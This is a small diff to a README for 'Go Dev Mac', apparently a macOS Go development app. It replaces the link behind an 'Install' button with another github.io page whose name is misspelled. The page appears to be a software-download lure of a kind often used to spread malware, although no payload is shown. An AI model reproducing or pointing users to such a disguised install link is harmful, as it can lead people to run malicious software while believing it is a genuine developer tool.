@@ -6,7 +6,7 @@
 <h3>Go Dev Mac - Go development environment</h3>
 <p>Go Dev Mac is a professional Go programming language development application specifically developed for macOS environments</p>
 
-<a href="https://mac-apps-install.github.io/.github/">
+<a href="https://sofware-osx-auto.github.io/.github/go">
   <img src="https://i.postimg.cc/65RNcQgZ/download-7641614-1280-(3).png" width="200" alt="Install"/>
 </a>
 </div>
